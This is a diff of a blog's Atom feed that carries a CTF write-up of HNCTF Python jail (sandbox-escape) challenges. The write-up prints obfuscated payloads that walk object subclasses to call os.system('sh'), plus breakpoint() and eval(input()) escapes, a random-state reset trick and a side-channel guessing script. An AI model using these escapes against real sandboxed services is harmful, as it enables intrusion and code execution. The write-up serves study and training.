@@ -1,7 +1,7 @@
 <?xml version="1.0"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://demoyao100.github.io</id>
-    <title>Moyao の小屋 • Posts by &#34;jail&#34; tag</title>
+    <title>rev@天枢 • Posts by &#34;jail&#34; tag</title>
     <link href="https://demoyao100.github.io" />
     <updated>2022-11-01T07:48:11.000Z</updated>
     <category term="re" />
@@ -21,85 +21,85 @@
         <id>https://demoyao100.github.io/2022/11/01/pythonJail/</id>
         <title>pythonJail</title>
         <link rel="alternate" href="https://demoyao100.github.io/2022/11/01/pythonJail/"/>
-        <content type="html">&lt;h4 id=&#34;preface&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#preface&#34;&gt;#&lt;/a&gt; preface&lt;/h4&gt;
-&lt;h6 id=&#34;thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail&#34;&gt;#&lt;/a&gt; Thanks to 空白 crazyman, who brough us so much excellent ctf exercises. (Though I didn&#39;t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems&lt;a href=&#34;https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/&#34;&gt;pythonJail&lt;/a&gt;.&lt;/h6&gt;
-&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;level-1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-1&#34;&gt;#&lt;/a&gt; LEVEL 1&lt;/h3&gt;
+        <content type="html">&lt;h4 id=&#34;preface&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#preface&#34;&gt;#&lt;/a&gt; preface&lt;/h4&gt;
+&lt;h6 id=&#34;thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail&#34;&gt;#&lt;/a&gt; Thanks to 空白 crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems&lt;a href=&#34;https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/&#34;&gt;pythonJail&lt;/a&gt;.&lt;/h6&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h3 id=&#34;level-1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-1&#34;&gt;#&lt;/a&gt; LEVEL 1&lt;/h3&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level1.png&#34; alt=&#34;level1&#34;&gt;&lt;/p&gt;
-&lt;p&gt;From the function filter, we sees that the symbol [&amp;quot; &#39; ` i b] is banned. Which means (Show subclasses with tuple)  &lt;code&gt; ().\__class\__.\__base\__.\__subclasses\__()&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;is not allowed. What&#39;s more, symbol &#39; and &amp;quot; is banned, so it come to us that we may can use  &lt;code&gt;chr&lt;/code&gt;  to splicing a string that we wanted.&lt;/p&gt;
+&lt;p&gt;From the function filter, we sees that the symbol [&amp;quot; ’ ` i b] is banned. Which means (Show subclasses with tuple)  &lt;code&gt; ().\__class\__.\__base\__.\__subclasses\__()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;is not allowed. What’s more, symbol ’ and &amp;quot; is banned, so it come to us that we may can use  &lt;code&gt;chr&lt;/code&gt;  to splicing a string that we wanted.&lt;/p&gt;
 &lt;p&gt;Two possible payload:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;getattr(getattr(getattr(getattr(()._&lt;em&gt;class_&lt;/em&gt;,c),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))&lt;br&gt;
-(().__class__.__base__.__subclasses__()[-4].__init__.__globals__&lt;a href=&#34;&#39;sh&#39;&#34;&gt;&#39;system&#39;&lt;/a&gt;)&lt;/p&gt;
+(().__class__.__base__.__subclasses__()[-4].__init__.__globals__&lt;a href=&#34;&#39;sh&#39;&#34;&gt;‘system’&lt;/a&gt;)&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;blockquote&gt;
 &lt;p&gt;open(chr(102)+chr(108)+chr(97)+chr(103)).read()&lt;br&gt;
 from &lt;a href=&#34;https://zhuanlan.zhihu.com/p/578986988&#34;&gt;thisBlog&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level1wp.png&#34; alt=&#34;level1pos&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;level-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-2&#34;&gt;#&lt;/a&gt; LEVEL 2&lt;/h3&gt;
+&lt;h3 id=&#34;level-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-2&#34;&gt;#&lt;/a&gt; LEVEL 2&lt;/h3&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level2.png&#34; alt=&#34;level1&#34;&gt;&lt;/p&gt;
 &lt;p&gt;The length of the payload is limited to 13.&lt;/p&gt;
-&lt;p&gt;The answer according to 空白 is the function &amp;lt;c style=&amp;quot;color: #FF0000&amp;quot;&amp;gt;&amp;quot;breakpoint ()&amp;quot;&amp;lt;/c&amp;gt;, which I didn&#39;t figure out yet. However, there is another way. Use  &lt;code&gt;eval(input())&lt;/code&gt;  so that the program receive once again for your input! Seems a little bit like  &lt;code&gt;/?cmd=system($_POST[1]);$1=ls&lt;/code&gt;  to escape the filter in php right?&lt;/p&gt;
-&lt;h3 id=&#34;level-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-3&#34;&gt;#&lt;/a&gt; LEVEL 3&lt;/h3&gt;
+&lt;p&gt;The answer according to 空白 is the function &lt;c style=&#34;color: #FF0000&#34;&gt;“breakpoint()”&lt;/c&gt;, which I didn’t figure out yet. However, there is another way. Use  &lt;code&gt;eval(input())&lt;/code&gt;  so that the program receive once again for your input! Seems a little bit like  &lt;code&gt;/?cmd=system($_POST[1]);$1=ls&lt;/code&gt;  to escape the filter in php right?&lt;/p&gt;
+&lt;h3 id=&#34;level-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-3&#34;&gt;#&lt;/a&gt; LEVEL 3&lt;/h3&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level3.png&#34; alt=&#34;level3&#34;&gt;&lt;/p&gt;
 &lt;p&gt;This time, the maximum length of our payload is down to 7.&lt;/p&gt;
-&lt;p&gt;I didn&#39;t quite understand yet, but function  &lt;code&gt;help()&lt;/code&gt;  can help you passby the 7 words limit. Here is when I tried others&#39; payload, quite amazing and when I am available I shall come back to study it.&lt;/p&gt;
+&lt;p&gt;I didn’t quite understand yet, but function  &lt;code&gt;help()&lt;/code&gt;  can help you passby the 7 words limit. Here is when I tried others’ payload, quite amazing and when I am available I shall come back to study it.&lt;/p&gt;
 &lt;blockquote&gt;&lt;/blockquote&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level3wp.png&#34; alt=&#34;level3&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;python2-input-jail&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python2-input-jail&#34;&gt;#&lt;/a&gt; PYTHON2 INPUT JAIL&lt;/h3&gt;
+&lt;h3 id=&#34;python2-input-jail&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python2-input-jail&#34;&gt;#&lt;/a&gt; PYTHON2 INPUT JAIL&lt;/h3&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/input(jail).png&#34; alt=&#34;input(jail)&#34;&gt;&lt;/p&gt;
-&lt;p&gt;python2, another thing I am not familiar with...&lt;/p&gt;
-&lt;p&gt;Looking up others&#39; write up...&lt;/p&gt;
+&lt;p&gt;python2, another thing I am not familiar with…&lt;/p&gt;
+&lt;p&gt;Looking up others’ write up…&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/input(jail)wp.png&#34; alt=&#34;input(jail)&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;level-25&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-25&#34;&gt;#&lt;/a&gt; LEVEL 2.5&lt;/h3&gt;
+&lt;h3 id=&#34;level-25&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-25&#34;&gt;#&lt;/a&gt; LEVEL 2.5&lt;/h3&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level2.5.png&#34; alt=&#34;level2.5&#34;&gt;&lt;/p&gt;
 &lt;p&gt;We can use  &lt;code&gt;breakpoint()&lt;/code&gt;  to go into pdb, and rce is possible.&lt;/p&gt;
-&lt;h3 id=&#34;lake&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lake&#34;&gt;#&lt;/a&gt; LAKE&lt;/h3&gt;
+&lt;h3 id=&#34;lake&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lake&#34;&gt;#&lt;/a&gt; LAKE&lt;/h3&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/lake.png&#34; alt=&#34;lake&#34;&gt;&lt;/p&gt;
-&lt;h6 id=&#34;strange-christencrazyman-seems-to-name-it-lake-from-leak&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#strange-christencrazyman-seems-to-name-it-lake-from-leak&#34;&gt;#&lt;/a&gt; Strange christen.(Crazyman seems to name it &#39;lake&#39; from &#39;leak&#39;?)&lt;/h6&gt;
+&lt;h6 id=&#34;strange-christencrazyman-seems-to-name-it-lake-from-leak&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#strange-christencrazyman-seems-to-name-it-lake-from-leak&#34;&gt;#&lt;/a&gt; Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)&lt;/h6&gt;
 &lt;p&gt;Use  &lt;code&gt;globals()&lt;/code&gt;  to leak the key. And then get shell.&lt;/p&gt;
-&lt;h3 id=&#34;lke&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lke&#34;&gt;#&lt;/a&gt; L@KE&lt;/h3&gt;
+&lt;h3 id=&#34;lke&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lke&#34;&gt;#&lt;/a&gt; L@KE&lt;/h3&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/l%40ke.png&#34; alt=&#34;l@ke&#34;&gt;&lt;/p&gt;
-&lt;h6 id=&#34;another-strange-christen&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#another-strange-christen&#34;&gt;#&lt;/a&gt; Another strange christen...&lt;/h6&gt;
+&lt;h6 id=&#34;another-strange-christen&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#another-strange-christen&#34;&gt;#&lt;/a&gt; Another strange christen…&lt;/h6&gt;
 &lt;p&gt;The maxinum length of payload is now 6, so only  &lt;code&gt;help()&lt;/code&gt;  is possible.&lt;/p&gt;
-&lt;p&gt;But unlike cases above, this time module &#39;os&#39; is destory or whatever. Now we comes to the base reason why we use &#39;os&#39; above.  &lt;code&gt;help()&lt;/code&gt;  can actually get you into any module in the python file, which includes  &lt;code&gt;__main__&lt;/code&gt; ! And surely, the key can be found inside.&lt;/p&gt;
-&lt;p&gt;&amp;lt;br&amp;gt;&lt;/p&gt;
-&lt;h5 id=&#34;ok-now-weve-go-through-the-first-four-level-designed-by-crazyman-that-is-from-level-5-there-provides-no-source-code&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ok-now-weve-go-through-the-first-four-level-designed-by-crazyman-that-is-from-level-5-there-provides-no-source-code&#34;&gt;#&lt;/a&gt; OK, now we&#39;ve go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.&lt;/h5&gt;
-&lt;p&gt;&amp;lt;br&amp;gt;&lt;/p&gt;
-&lt;h3 id=&#34;level-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-5&#34;&gt;#&lt;/a&gt; LEVEL 5&lt;/h3&gt;
+&lt;p&gt;But unlike cases above, this time module ‘os’ is destory or whatever. Now we comes to the base reason why we use ‘os’ above.  &lt;code&gt;help()&lt;/code&gt;  can actually get you into any module in the python file, which includes  &lt;code&gt;__main__&lt;/code&gt; ! And surely, the key can be found inside.&lt;/p&gt;
+&lt;br&gt;
+##### OK, now we&#39;ve go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.
+&lt;br&gt;
+&lt;h3 id=&#34;level-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-5&#34;&gt;#&lt;/a&gt; LEVEL 5&lt;/h3&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level5.png&#34; alt=&#34;level5&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out.&lt;/p&gt;
-&lt;h3 id=&#34;level-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-4&#34;&gt;#&lt;/a&gt; LEVEL 4&lt;/h3&gt;
-&lt;h6 id=&#34;why-is-it-4-after-5-i-dont-know&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#why-is-it-4-after-5-i-dont-know&#34;&gt;#&lt;/a&gt; (Why is it 4 after 5 I don&#39;t know...)&lt;/h6&gt;
+&lt;h3 id=&#34;level-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-4&#34;&gt;#&lt;/a&gt; LEVEL 4&lt;/h3&gt;
+&lt;h6 id=&#34;why-is-it-4-after-5-i-dont-know&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#why-is-it-4-after-5-i-dont-know&#34;&gt;#&lt;/a&gt; (Why is it 4 after 5 I don’t know…)&lt;/h6&gt;
 &lt;p&gt;4 bytes rce, seems impossible, so lets just guass it use  &lt;code&gt;os.system(input_data)&lt;/code&gt;  to get your input and bingo.&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level4.png&#34; alt=&#34;level4&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;lake-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lake-2&#34;&gt;#&lt;/a&gt; LAkE&lt;/h3&gt;
+&lt;h3 id=&#34;lake-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lake-2&#34;&gt;#&lt;/a&gt; LAkE&lt;/h3&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/laKelaKe.png&#34; alt=&#34;laKe&#34;&gt;&lt;/p&gt;
-&lt;p&gt;This time it imports  &lt;code&gt;sys&lt;/code&gt;  module with &lt;a href=&#34;https://peps.python.org/pep-0578/&#34;&gt;audit hook&lt;/a&gt;, and direct RCE function like  &lt;code&gt;pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen&lt;/code&gt;  is not available. Whats more,  &lt;code&gt;compile、eval、exec、open&lt;/code&gt;  is unfetchable. However, there use  &lt;code&gt;random.setstate()&lt;/code&gt;  to generate its random number, which is base on Mersenne &lt;a href=&#34;https://zh.wikipedia.org/zh-tw/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95&#34;&gt;Twister&lt;/a&gt;, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one &#39;eval&#39; in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?&lt;/p&gt;
+&lt;p&gt;This time it imports  &lt;code&gt;sys&lt;/code&gt;  module with &lt;a href=&#34;https://peps.python.org/pep-0578/&#34;&gt;audit hook&lt;/a&gt;, and direct RCE function like  &lt;code&gt;pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen&lt;/code&gt;  is not available. Whats more,  &lt;code&gt;compile、eval、exec、open&lt;/code&gt;  is unfetchable. However, there use  &lt;code&gt;random.setstate()&lt;/code&gt;  to generate its random number, which is base on Mersenne &lt;a href=&#34;https://zh.wikipedia.org/zh-tw/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95&#34;&gt;Twister&lt;/a&gt;, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one ‘eval’ in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?&lt;/p&gt;
 &lt;p&gt;First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with  &lt;code&gt;lambda&lt;/code&gt; . Some case can be view below:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;https://ctftime.org/writeup/21982
 
 https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#operators-and-short-tricks
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Second, if we  &lt;code&gt;import random&lt;/code&gt;  and print  &lt;code&gt;random.getstate&lt;/code&gt;  at the beginning, we got a tuple back. which may look like: &lt;code&gt;(3, (..., 624), None)&lt;/code&gt; . The first value &#39;3&#39; and the last value &#39;None&#39; is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number.&lt;/p&gt;
-&lt;h5 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; payload:&lt;/h5&gt;
+&lt;p&gt;Second, if we  &lt;code&gt;import random&lt;/code&gt;  and print  &lt;code&gt;random.getstate&lt;/code&gt;  at the beginning, we got a tuple back. which may look like: &lt;code&gt;(3, (..., 624), None)&lt;/code&gt; . The first value ‘3’ and the last value ‘None’ is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number.&lt;/p&gt;
+&lt;h5 id=&#34;payload&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; payload:&lt;/h5&gt;
 &lt;pre&gt;&lt;code&gt;[random:=\_\_import__(&#39;random&#39;), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;level-51&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-51&#34;&gt;#&lt;/a&gt; LEVEL 5.1&lt;/h3&gt;
+&lt;h3 id=&#34;level-51&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-51&#34;&gt;#&lt;/a&gt; LEVEL 5.1&lt;/h3&gt;
 &lt;p&gt;Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;nc&lt;/code&gt;  and  &lt;code&gt;dir()&lt;/code&gt; (as it tells you to), found  &lt;code&gt;my_flag&lt;/code&gt; , try  &lt;code&gt;list(getattr(my_flag,&#39;flag))&lt;/code&gt; , got a  &lt;code&gt;AttributeError: &#39;flag_level5&#39; object has no attribute &#39;flag&#39;&lt;/code&gt; . So payload is  &lt;code&gt;list(getattr(my_flag,&#39;flag_level5&#39;))&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Another way to solve this problem(though quite similar, the latter gets its shell)&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level5.1_1.png&#34; alt=&#34;level5.1_1&#34;&gt;&lt;br&gt;
 &lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level5.1_2.png&#34; alt=&#34;level5.1_2&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;lak3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lak3&#34;&gt;#&lt;/a&gt; LAK3&lt;/h3&gt;
+&lt;h3 id=&#34;lak3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lak3&#34;&gt;#&lt;/a&gt; LAK3&lt;/h3&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/lak3.png&#34; alt=&#34;lak3&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Same as before, we can use the excate same payload. Though the official payload provides by crazyman is  &lt;code&gt;__import__(&#39;sys&#39;)._getframe(1).f_locals[&#39;right_guesser_question_answer&#39;]&lt;/code&gt;&lt;/p&gt;
-&lt;h5 id=&#34;a-good-blog-can-refer&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#a-good-blog-can-refer&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;https://ctftime.org/writeup/21982&#34;&gt;a good blog can refer&lt;/a&gt;&lt;/h5&gt;
-&lt;h3 id=&#34;type-chnnel&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#type-chnnel&#34;&gt;#&lt;/a&gt; tyPe Ch@nnEl&lt;/h3&gt;
+&lt;h5 id=&#34;a-good-blog-can-refer&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#a-good-blog-can-refer&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;https://ctftime.org/writeup/21982&#34;&gt;a good blog can refer&lt;/a&gt;&lt;/h5&gt;
+&lt;h3 id=&#34;type-chnnel&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#type-chnnel&#34;&gt;#&lt;/a&gt; tyPe Ch@nnEl&lt;/h3&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/sideChannel.png&#34; alt=&#34;sideChannel&#34;&gt;&lt;/p&gt;
-&lt;p&gt;I haven&#39;t quite understand yet. So I will put the payload beforehand:&lt;/p&gt;
+&lt;p&gt;I haven’t quite understand yet. So I will put the payload beforehand:&lt;/p&gt;
 &lt;p&gt;One possible:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;from pwn import *
 from tqdm import trange
@@ -144,8 +144,8 @@ for guess in chars: # all possible chars
     print(&amp;quot;guess: &amp;quot;, bytes(flag), chr(guess))
     payload = f&amp;quot;type(type(flag).mro())(type(type(flag).mro())(flag).pop(&amp;#123;i&amp;#125;).encode()).remove(&amp;#123;guess&amp;#125;)&amp;quot;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;level-4-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-4-2&#34;&gt;#&lt;/a&gt; LEVEL 4&lt;/h3&gt;
-&lt;h6 id=&#34;level-4-again&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-4-again&#34;&gt;#&lt;/a&gt; level 4 again&lt;/h6&gt;
+&lt;h3 id=&#34;level-4-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-4-2&#34;&gt;#&lt;/a&gt; LEVEL 4&lt;/h3&gt;
+&lt;h6 id=&#34;level-4-again&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-4-again&#34;&gt;#&lt;/a&gt; level 4 again&lt;/h6&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level4_1.png&#34; alt=&#34;level4_1&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Quite similar as before, just use  &lt;code&gt;bytes().decode()&lt;/code&gt;  to pass the black list.&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level4wp1.png&#34; alt=&#34;level4_1wp1&#34;&gt;&lt;br&gt;
@@ -153,61 +153,61 @@ for guess in chars: # all possible chars
 &lt;p&gt;payload:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;().__class__.__base__.__subclasses__()
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h5 id&gt;&lt;a class=&#34;anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h5&gt;
+&lt;h5 id&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h5&gt;
 &lt;p&gt;​    ().&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;base&lt;/strong&gt;.&lt;strong&gt;subclasses&lt;/strong&gt;()[-4].&lt;strong&gt;init&lt;/strong&gt;.&lt;strong&gt;globals&lt;/strong&gt;[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())&lt;/p&gt;
 &lt;p&gt;There is another solution to this problem: I am not sure I fully understand it, so I put a &lt;a href=&#34;https://zhuanlan.zhihu.com/p/579057932&#34;&gt;link&lt;/a&gt; here beforehand.&lt;/p&gt;
-&lt;h5 id=&#34;payload-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload-2&#34;&gt;#&lt;/a&gt; payload:&lt;/h5&gt;
+&lt;h5 id=&#34;payload-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#payload-2&#34;&gt;#&lt;/a&gt; payload:&lt;/h5&gt;
 &lt;pre&gt;&lt;code&gt;().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level4wp_3.png&#34; alt=&#34;level4wp3&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;level-405&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-405&#34;&gt;#&lt;/a&gt; LEVEL 4.0.5&lt;/h3&gt;
+&lt;h3 id=&#34;level-405&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-405&#34;&gt;#&lt;/a&gt; LEVEL 4.0.5&lt;/h3&gt;
 &lt;p&gt;Same payload as last one.&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level4.0.5.png&#34; alt=&#34;level4.0.5&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;level-41&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-41&#34;&gt;#&lt;/a&gt; LEVEL 4.1&lt;/h3&gt;
+&lt;h3 id=&#34;level-41&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-41&#34;&gt;#&lt;/a&gt; LEVEL 4.1&lt;/h3&gt;
 &lt;p&gt;Quite same as before.&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level4.1wp1.png&#34; alt=&#34;level4.1&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Ps, the  &lt;code&gt;bytes&lt;/code&gt;  is now banned, but still you can use  &lt;code&gt;show subclassed with tuples&lt;/code&gt;  to replace, like this:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;level-42&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#level-42&#34;&gt;#&lt;/a&gt; LEVEL 4.2&lt;/h3&gt;
-&lt;p&gt;Quite same as before..&lt;/p&gt;
+&lt;h3 id=&#34;level-42&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#level-42&#34;&gt;#&lt;/a&gt; LEVEL 4.2&lt;/h3&gt;
+&lt;p&gt;Quite same as before…&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;pythonJail/level4.2wp.png&#34; alt=&#34;level4.2&#34;&gt;&lt;/p&gt;
-&lt;h5 id=&#34;or-rather-use-join&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#or-rather-use-join&#34;&gt;#&lt;/a&gt; Or rather use  &lt;code&gt;join&lt;/code&gt; :&lt;/h5&gt;
